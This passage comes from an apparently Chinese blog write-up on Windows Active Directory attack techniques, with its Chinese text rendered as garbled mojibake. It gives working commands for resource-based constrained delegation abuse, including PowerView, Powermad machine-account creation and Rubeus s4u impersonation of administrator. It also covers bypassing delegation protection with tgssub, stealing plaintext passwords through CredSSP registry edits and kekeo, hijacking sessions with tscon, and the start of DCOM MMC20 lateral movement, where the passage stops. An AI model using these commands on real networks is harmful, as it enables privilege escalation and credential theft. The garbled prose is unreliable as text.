title="å®æ“"></a>å®æ“</h4><p>è¿™ä¸ªæ”»å‡»è¯´ç™½äº†å°±æ˜¯ä¸ªææƒâ€¦</p><p>é¦–å…ˆæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸŸæ§æ˜¯å¦æ˜¯win2012ä»¥ä¸Šçš„ä¸»æœºï¼Œå› ä¸ºåªæœ‰è¿™æ ·æ‰èƒ½å¼€å¯ åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨powersploitä¸‹çš„powerviewè„šæœ¬ã€‚æ‰§è¡Œå‘½ä»¤ get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQæˆªå›¾20210217135833"></p><p>å¯ä»¥è·å¾—åŸŸæ§WINç‰ˆæœ¬</p><p>ç„¶åæˆ‘ä»¬æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹å“ªå°ä¸»æœºæœ‰å†™æƒé™ã€‚å› ä¸ºæ˜¯å®éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ€ä¹ˆé…ç½®ä¸€ä¸ªç”¨æˆ·å¯¹ä¸€ä¸ªæœºå™¨çš„æƒé™ã€‚<br>ç›´æ¥åœ¨åŸŸæ§ä¸Šæ‰¾åˆ°æŸä¸»æœºï¼Œç„¶åè¿›å…¥åœ¨å±æ€§é‡Œè¿›å…¥å®‰å…¨é€‰é¡¹å¡ï¼Œæ·»åŠ æŸç”¨æˆ·ï¼Œç„¶åç»™è¿™ä¸ªç”¨æˆ·åˆ†é…æƒé™å³å¯ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQæˆªå›¾20210217135859"></p><p>æˆ‘ä»¬ä¾æ—§ä½¿ç”¨powerviewã€‚å…ˆè°ƒç”¨<br><code>Get-DomainUser -Identity username -Properties objectsid</code>æ¥è·å–å½“å‰ç”¨æˆ·SID<br>ç„¶å<code>Get-DomainObjectAcl -Identity ä¸»æœºå | ?&#123;$_.SecurityIdentifier -match &quot;åˆšåˆšå¾—åˆ°çš„SID&quot;&#125;</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQæˆªå›¾20210217140628"></p><p>å¦‚æœæœ‰ GenericAllï¼ˆå®Œå…¨æ§åˆ¶æƒï¼‰ï¼ŒGenericWriteã€WritePropertyã€WriteDacl è¿™äº›å±æ€§ï¼Œå°±è¯´æ˜è¯¥ç”¨æˆ·èƒ½ä¿®æ”¹è®¡ç®—æœºçš„è´¦æˆ·å±æ€§ã€‚<br>å¦‚å›¾çœ‹åˆ°æˆ‘ä»¬å¯¹WIN7è¿›è¡Œæ“ä½œ</p><p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦åˆ›ç«‹ä¸€ä¸ªæœºå™¨ç”¨æˆ·äº†ã€‚æ ¹æ®ç½‘ä¸Šæœç´¢ç»“æœï¼Œä½¿ç”¨powermadè¿™ä¸ªpsè„šæœ¬å¯ä»¥å¾ˆå¿«æ·çš„åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ·ã€‚<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQæˆªå›¾20210217140659"></p><p>å¥½çš„ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯†ç hackï¼Œåä¸ºhacksystemçš„æœºå™¨è´¦æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½®hacksystemåˆ°WIN7çš„å§”æ´¾äº†ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œæ˜¯ä¿®æ”¹WIN7çš„ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>å±æ€§çš„å€¼ ï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬ç”¨powerviewå®ç°ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#è¿™å„¿çš„sidæ˜¯æˆ‘ä»¬åˆ›å»ºçš„#æœºå™¨ç”¨æˆ·#evilsystemçš„sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQæˆªå›¾20210217140726"></p><p>è‡³äºæœºå™¨è´¦æˆ·SIDæ€ä¹ˆè·å¾—ï¼Œpowerviewä¸‹çš„ <code>get-domiancomputer hacksystem</code><br>ç„¶åä½¿ç”¨<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> æŸ¥çœ‹å§”æ´¾æ˜¯å¦è®¾ç½®æˆåŠŸ</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>æ­¤å‘½ä»¤å¯ä»¥æ¸…é™¤ msds-allowedtoactonbehalfofotheridentityå±æ€§çš„å€¼</p><p>ç°åœ¨éƒ½ç»Ÿç»Ÿè®¾ç½®å¥½äº†ï¼Œå¼€å§‹ä¸‹ä¸€æ­¥å§ã€‚<br>ç½‘ä¸Šä¸€èˆ¬ç”¨çš„rubeusï¼Œè¿™é‡Œæˆ‘ç”¨kekeoå§</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¿ç®—å‡ºæœºå™¨ç”¨æˆ·ntlm hash è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„å›¾</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQæˆªå›¾20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> å†™å…¥ç¥¨æ®</p><p>ç„¶åæˆ‘åœ¨æœ¬æœºä½¿ç”¨ä»¥ä¸Šæ–¹æ³•åklistä¸€ä¸‹ï¼Œå‘ç°ç¡®å®å­˜åœ¨ç¥¨æ®</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQæˆªå›¾20210217140737"></p><p>ä½†æ˜¯dir \test1\c$æ—¶æœ¬æœºè«åå…¶å¦™ä¸èƒ½è¿›è¡ŒkerberoséªŒè¯ï¼Œæˆ‘æœäº†ã€‹ã€‚ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œæˆ‘ä»¬æ‹¿åˆ°é“¶ç¥¨äº†</p><h4 id="æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡"><a href="#æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡" class="headerlink" title="æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡"></a>æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQæˆªå›¾20210217141050"></p><p>è‹¥æˆ‘ä»¬çš„administratorç”¨æˆ·è¢«è®¾ç½®ä¸ºæ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾æˆ–è€…è¢«åŠ å…¥ä¿æŠ¤ç»„ï¼ŒæŒ‰ç†è¯´ä»–çš„è®¿é—®å°±ä¸èƒ½è¿›è¡Œå§”æ´¾ã€‚</p><p>æˆ‘ä»¬åœ¨ä»¥administratorè´¦æˆ·èº«ä»½è¿›è¡ŒS4Uæ—¶ï¼Œåªèƒ½è¿›è¡ŒS4U2SELFï¼Œä¸èƒ½è¿›è¡ŒS4U2PROXYã€‚æˆ‘ä»¬ç”¨ <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>ç»§ç»­å®éªŒadministratorï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ ·</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQæˆªå›¾20210217141131"></p><p>æ­¤æ—¶æˆ‘ä»¬ç”¨ rubeus.exe describe /ticker:S4Ubase64åŠ å¯†çš„ç¥¨æ®</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQæˆªå›¾20210217141313"></p><p>å¯ä»¥å‘ç°servicenameå¹¶æ²¡æœ‰æŒ‡å®šæŸä¸ªæœåŠ¡ï¼Œä»…ä»…åªæœ‰ä¸€ä¸ªè´¦æˆ·.å³å‘ç”Ÿäº†æœåŠ¡åç§°ç¼ºå¤±çš„é—®é¢˜ã€‚å¾ˆç®€å•ï¼ŒæŠŠç¥¨æ®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†.ç½‘ä¸Šå¾ˆå¤šè¯´ç”¨è¿™ä¸ªå·¥å…·<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>ä½†å®é™…ä¸Šrubeusä¹Ÿèƒ½å®Œæˆç¥¨æ®ä¿®æ”¹<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQæˆªå›¾20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQæˆªå›¾20210217141339"></p><p>å®Œäº‹</p><h2 id="credssp-å¯¼å‡ºç”¨æˆ·æ˜æ–‡å¯†ç "><a href="#credssp-å¯¼å‡ºç”¨æˆ·æ˜æ–‡å¯†ç " class="headerlink" title="credssp å¯¼å‡ºç”¨æˆ·æ˜æ–‡å¯†ç "></a>credssp å¯¼å‡ºç”¨æˆ·æ˜æ–‡å¯†ç </h2><p>CredSSPåè®®çš„ç›®çš„æ˜¯å°†ç”¨æˆ·çš„æ˜æ–‡å¯†ç ä»CredSSPå®¢æˆ·ç«¯å§”æ´¾ç»™CredSSPæœåŠ¡å™¨ã€‚ é€šå¸¸è¿ç”¨äºè¿œç¨‹æ¡Œé¢æœåŠ¡ã€‚</p><p>æˆ‘ä»¬åœ¨é…ç½®è¿™ä¸ªåè®®æ—¶ï¼Œä¸€èˆ¬åœ¨ç»„ç­–ç•¥ç¼–è¾‘å™¨é‡Œé…ç½®ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png" alt="QQæˆªå›¾20210217143231"></p><p>Allow delegating default credentialsè¡¨ç¤ºåœ¨é€šè¿‡ä½¿ç”¨å—ä¿¡ä»»çš„X509è¯ä¹¦æˆ–Kerberoså®ç°æœåŠ¡å™¨èº«ä»½éªŒè¯æ—¶è‡ªåŠ¨å‘é€å½“å‰ç”¨æˆ·çš„å‡­æ®ï¼Œå³æ˜æ–‡å¯†ç ã€‚</p><p>Allow delegating default credentials with NTLM-only server authenticationè¡¨ç¤ºåœ¨é€šè¿‡NTLMå®ç°æœåŠ¡å™¨èº«ä»½éªŒè¯æ—¶è‡ªåŠ¨å‘é€å½“å‰ç”¨æˆ·çš„å‡­æ®ï¼Œå³æ˜æ–‡å¯†ç ã€‚</p><p>è¿™å‡ ä¸ªå±æ€§åœ¨æ³¨å†Œè¡¨é‡Œå¯¹åº” HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegationã€‚</p><h3 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h3><p>é‚£ä¹ˆè¿™æ ·çœ‹ï¼Œè¿™ä¸ªæ”»å‡»æµç¨‹å°±å¾ˆè‡ªç„¶äº†ã€‚<br>æˆ‘ä»¬è¦è·å¾—ä¸¤å°æœºå™¨ï¼Œä¸€å°æœºå™¨å½“ä½œè¿œç¨‹æ¡Œé¢çš„æœåŠ¡å™¨ï¼Œä¸€å°å½“ä½œè¿œç¨‹æ¡Œé¢çš„å®¢æˆ·ç«¯ã€‚<br>åœ¨å®¢æˆ·ç«¯ä¸Šé…ç½®ç»„ç­–ç•¥ï¼ˆCREDSSPï¼‰ï¼Œä½¿å…¶åœ¨è¿œç¨‹æ¡Œé¢èº«ä»½éªŒè¯æ—¶å‘é€æ˜æ–‡å¯†ç ã€‚<br>ç„¶åå¼€å§‹è¿œç¨‹æ¡Œé¢éªŒè¯ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè·å¾—å®¢æˆ·ç«¯å‘æ¥çš„æ˜æ–‡å¯†ç .</p><h3 id="å®æ“-1"><a href="#å®æ“-1" class="headerlink" title="å®æ“"></a>å®æ“</h3><p>1.é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œæ”¹å˜ç»„ç­–ç•¥èº«ä»½éªŒè¯çš„å‡­æ®ç­–ç•¥(é€‰ä¸€ä¸ªï¼‰ï¼Œè¿™ä¸€æ­¥éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæœ¬åœ°æˆ–åŸŸç®¡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br></pre></td></tr></table></figure><p>ä¸€è‚¡è„‘è®¾ç½®å¥½å°±å®Œäº‹äº†ã€‚ã€‚ï¼ˆç”¨æˆ·éœ€é‡æ–°ç™»é™†æ‰ç”Ÿæ•ˆï¼‰</p><p>ç„¶åå¼€å§‹è·å–å¯†ç </p><p>æˆ‘ä»¬åˆšåˆšæåˆ°éœ€è¦ä¸¤å°ç”µè„‘æ‰èƒ½è·å–å¯†ç ï¼Œå…¶å®é‚£åªæ˜¯ä¸€ä¸ªæ¨¡å‹ï¼Œä¸€ä¸ªæœºå™¨æ—¢å¯ä»¥å½“ä½œå®¢æˆ·ç«¯åˆå¯ä»¥å½“ä½œæœåŠ¡ç«¯çš„ã€‚<br>æˆ‘ä»¬ç”¨kekeoå®ç°æ”»å‡»ï¼ˆæœ¬æœºå‘æœ¬æœºè·å–å¯†ç æ—¶ï¼Œæ™®é€šç”¨æˆ·å³å¯å®Œæˆä»¥ä¸‹æ“ä½œï¼‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tsssp::server å¼€å¯æœåŠ¡ç«¯</span><br><span class="line">tsssp::client &#x2F;target:...   å¼€å¯å®¢æˆ·ç«¯ï¼Œè¿™é‡Œçš„targetéšä¾¿å¡«</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png" alt="QQæˆªå›¾20210217143306"></p><p>é‚£ä¹ˆå†å›åˆ°éœ€è¦ä¸¤ä¸ªæœºå™¨ï¼Œä¸€ä¸ªå½“æœåŠ¡ç«¯ä¸€ä¸ªå½“å®¢æˆ·ç«¯çš„æƒ…å†µå§ã€‚</p><p>æœåŠ¡ç«¯å»ºç«‹: tsssp::server éœ€è¦SYSTEMæƒé™</p><p>å®¢æˆ·ç«¯é“¾æ¥: tsssp::client /target:æœåŠ¡ç«¯çš„SPNï¼ˆä¸€èˆ¬é‡‡ç”¨TERMSRVæœåŠ¡ï¼‰ /pipe: \æœåŠ¡ç«¯åŸŸå\pipe\kekeo_tsssp_endpoint æ™®é€šç”¨æˆ·æƒé™å³å¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png" alt="QQæˆªå›¾20210217143322"></p><h2 id="tsconæ¨ªå‘"><a href="#tsconæ¨ªå‘" class="headerlink" title="tsconæ¨ªå‘"></a>tsconæ¨ªå‘</h2><p>è‹¥ä¸€ä¸ªæœºå™¨ä¸Šæœ‰å¤šä¸ªç”¨æˆ·ç™»å½•ï¼Œåˆ™åœ¨ä»»åŠ¡ç®¡ç†å™¨å¯ä»¥çœ‹è§å¦‚ä¸‹åœºé¢</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png" alt="QQæˆªå›¾20210217143439"></p><p>å…¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å³é”®å…¶ä»–ç”¨æˆ·é€‰æ‹©é“¾æ¥ï¼Œè¾“å…¥å…¶å¯†ç åå°±èƒ½è¿›å…¥å…¶æ¡Œé¢</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png" alt="QQæˆªå›¾20210217143500"></p><p>ä½†æ˜¯å¯¹äºsystemç”¨æˆ·æ¥è¯´ï¼Œè¦é“¾æ¥åˆ°å…¶ä»–ç”¨æˆ·æ˜¯ä¸éœ€è¦è¾“å…¥å¯†ç çš„ï¼Œå¯ä»¥ç›´æ¥è¿æ¥ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡systemæƒé™è·å–ç™»å½•åœ¨å½“å‰æœºå™¨ä¸Šçš„åŸŸç”¨æˆ·æƒé™ã€‚<br>æ¯”å¦‚ä¸Šå›¾ä¸­çš„administratoræ˜¯åŸŸç®¡ï¼Œæˆ‘æœ‰å½“å‰æœºå™¨çš„systemæƒé™ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥ç›´æ¥ç”¨ä»¥ä¸‹å‘½ä»¤å®Œæˆç”¨æˆ·æƒé™è·å¾—ã€‚</p><p>query user è·å¾—administratorç”¨æˆ·çš„id</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png" alt="QQæˆªå›¾20210217143547"></p><p>å¯ä»¥å‘ç°adminçš„idæ˜¯2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨tsconè¿™ä¸ªwindowsè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·å®Œæˆæƒé™è·å¾—ã€‚</p><p>cmd /k tscon 2 /dest:console</p><p>æ‰§è¡Œä»¥ä¸Šå‘½ä»¤ï¼Œæˆ‘ä»¬è·³è½¬åˆ°äº†adminçš„æ¡Œé¢</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png" alt="QQæˆªå›¾20210217143616"></p><h2 id="åˆ©ç”¨COM-DCOMå¯¹è±¡"><a href="#åˆ©ç”¨COM-DCOMå¯¹è±¡" class="headerlink" title="åˆ©ç”¨COM/DCOMå¯¹è±¡"></a>åˆ©ç”¨COM/DCOMå¯¹è±¡</h2><p>å‚è€ƒ:<a href="https://www.freebuf.com/articles/network/256372.html">https://www.freebuf.com/articles/network/256372.html</a> </p><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>DCOMæ˜¯COMçš„æ‰©å±•ï¼Œå…è®¸åº”ç”¨ç¨‹åºå®ä¾‹åŒ–å’Œè®¿é—®è¿œç¨‹è®¡ç®—æœºä¸Šçš„COMå¯¹è±¡ã€‚<br>è¿™é‡Œç®€è¦è¯´ä¸€ä¸‹å‡ ä¸ªæœ‰å…³COMçš„æ¦‚å¿µ</p><p>CLSIDï¼šåˆå«CLASSID ä¸€ä¸ªCOMç±»çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œæ¯ä¸€ä¸ªWindowsæ³¨å†Œç±»ä¸ä¸€ä¸ªCLSIDç›¸å…³è”ã€‚é•¿å¾—åƒè¿™æ · {20D04FE0-3AEA-1069-A2D8-08002B30309D}</p><p>ProgIDï¼šå…¶å¯è¢«ç”¨ä½œå¯¹ç”¨æˆ·æ›´å‹å¥½çš„æ›¿ä»£çš„ä¸€ä¸ªCLSIDï¼Œæ¯”å¦‚MMC20.APPLICATION.1å°±æ˜¯ä¸€ä¸ªProgIDã€‚ProgIDä¸èƒ½ä¿è¯æ˜¯å”¯ä¸€çš„ï¼Œå¹¶éæ¯ä¸ªç±»éƒ½ä¸ProgIDç›¸å…³è”</p><p>Appid: ä¸ºäº†ä¿è¯COMå¯¹è±¡èƒ½è¢«é¡ºåˆ©çš„è¿œç¨‹è°ƒç”¨ï¼ˆå³ä¸ºäº†ä½¿DCOMå¯è®¿é—®COMå¯¹è±¡ï¼‰ï¼Œéœ€è¦æŠŠAPPIDä¸è¯¥ç±»çš„CLSIDç›¸å…³è”ï¼Œä¸”AppIDéœ€è®¾ç½®æƒé™æ¥è§„åˆ’å“ªäº›å®¢æˆ·ç«¯èƒ½å¤Ÿè®¿é—®</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡powershellæ‰§è¡Œget-CimInstance æ¥åˆ—å‡ºæœ¬åœ°COMç¨‹åºåˆ—è¡¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png" alt="image-20210223152713449"></p><p>è¿œç¨‹DCOMå¯¹è±¡å®ä¾‹åŒ–çš„æµç¨‹:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å®¢æˆ·ç«¯ä»è¿œç¨‹è®¡ç®—æœºè¯·æ±‚å®ä¾‹åŒ–ç”±CLSIDè¡¨ç¤ºçš„å¯¹è±¡ã€‚å¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨ProgIDåˆ™å…ˆå°†å…¶æœ¬åœ°è§£æä¸ºCLSIDã€‚</span><br><span class="line">è¿œç¨‹è®¡ç®—æœºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç”±è¯¥CLSIDæ‰€å…³è”çš„AppIDï¼Œå¹¶éªŒè¯å®¢æˆ·ç«¯çš„æƒé™ã€‚</span><br><span class="line">DCOMLaunchæœåŠ¡å°†åˆ›å»ºæ‰€è¯·æ±‚çš„ç±»çš„å®ä¾‹ï¼Œé€šå¸¸æ˜¯é€šè¿‡è¿è¡ŒLocalServer32å­é¡¹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ–è€…é€šè¿‡åˆ›å»ºDllHostè¿›ç¨‹æ¥æ‰¿è½½InProcServer32å­é¡¹å¼•ç”¨çš„dllã€‚</span><br><span class="line">å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºå’ŒæœåŠ¡å™¨è¿›ç¨‹é—´å»ºç«‹é€šä¿¡ï¼Œå®¢æˆ·ç«¯ä¾¿å¯ä»¥è®¿é—®æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚</span><br></pre></td></tr></table></figure><h3 id="MMC20-APPLICATION-1"><a href="#MMC20-APPLICATION-1" class="headerlink" title="MMC20.APPLICATION.1"></a>MMC20.APPLICATION.1</h3><p>ä¸­æ–‡åä¸ºï¼š Microsoftç®¡ç†æ§åˆ¶å°ï¼ˆMMCï¼‰2.0åŒ…æ‹¬è„šæœ¬å¯¹è±¡æ¨¡å‹ã€‚ æˆ‘ä»¬ä¸€æ­¥æ­¥æŠ½ä¸å‰¥èŒ§è·Ÿè¸ªä¸€ä¸‹è¿™ä¸ªå¯¹è±¡çš„åˆ©ç”¨ç‚¹ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯è°ƒç”¨è¯¥å¯¹è±¡å¿…é¡»è¦æœ‰ç®¡ç†å‘˜æƒé™ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png" alt="image-20210223161553486"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png" alt="image-20210223160909543"></p><p>å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å…ˆåˆ—å‡ºåœ¨MMC20.APPLICATIONä¸­çš„æ¨¡å—ï¼Œç„¶åç»§ç»­åˆ—å‡ºå…¶ä¸­Documentä¸­çš„å±æ€§ï¼Œå†ç»§ç»­åˆ—å‡ºDocument.ActiveViewä¸­çš„å±æ€§ã€‚å¯ä»¥å‘ç°ä¸€ä¸ªåä¸ºExecuteShellCommandçš„æ–¹æ³•ï¼Œå…‰æ˜¯å¬åå­—å°±çŸ¥é“æ˜¯å¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„æ–¹æ³•äº†ã€‚åˆ°å¾®è½¯æ–‡æ¡£æŸ¥ä¸€æŸ¥è¿™ä¸ªæ–¹æ³•ï¼Œè·å¾—äº†ä»¥ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecuteShellCommandï¼ˆ[å‘½ä»¤][ç›®å½•][åæ•°][çª—å£çŠ¶æ€]ï¼‰</span><br><span class="line">å‘½ä»¤</span><br><span class="line">ä¸€ä¸ªå€¼ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¯ä»¥æŒ‡å®šæ ‡å‡†è·¯å¾„ã€‚Commandä¸­åŒ…å«çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ˆä¾‹å¦‚â€œï¼…windirï¼…â€ï¼‰éƒ½å°†è¢«æ‰©å±•ã€‚</span><br><span class="line"></span><br><span class="line">ç›®å½•</span><br><span class="line">ä¸€ä¸ªå€¼ï¼Œç”¨äºæŒ‡å®šå·¥ä½œç›®å½•çš„åç§°ã€‚Directoryä¸­åŒ…å«çš„æ‰€æœ‰ç¯å¢ƒå˜é‡éƒ½å°†è¢«æ‰©å±•ã€‚å¦‚æœâ€œç›®å½•â€ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™å°†å½“å‰ç›®å½•ç”¨ä½œå·¥ä½œç›®å½•ã€‚</span><br><span class="line"></span><br><span class="line">å‚æ•°</span><br><span class="line">ä¸€ä¸ªæŒ‡å®šCommandè¦ä½¿ç”¨çš„å‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰çš„å€¼ï¼›å‚æ•°å¿…é¡»ç”¨ç©ºæ ¼åˆ†éš”ã€‚ä¾‹å¦‚ï¼Œå°†å‚æ•°æŒ‡å®šä¸ºâ€œ Param1 Param2â€ä¼šå¯¼è‡´Commandæ¥æ”¶Param1å’ŒParam2ä½œä¸ºå‚æ•°ã€‚å¦‚æœè¦æ±‚å•ä¸ªå‚æ•°ç”¨åŒå¼•å·å¼•èµ·æ¥ï¼Œè¯·ä½¿ç”¨é€‚åˆæ‚¨çš„ç¼–ç¨‹è¯­è¨€çš„æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œåœ¨Microsoft Visual Basicä¸­ï¼Œå°†å‚æ•°æŒ‡å®šä¸ºâ€œ Param1â€â€œè¿™æ˜¯Param2â€â€œâ€å¯¼è‡´å‘½ä»¤æ¥æ”¶åˆ°å‚æ•°1å’Œâ€œè¿™æ˜¯Param2â€ã€‚</span><br><span class="line"></span><br><span class="line">çª—å£çŠ¶æ€</span><br><span 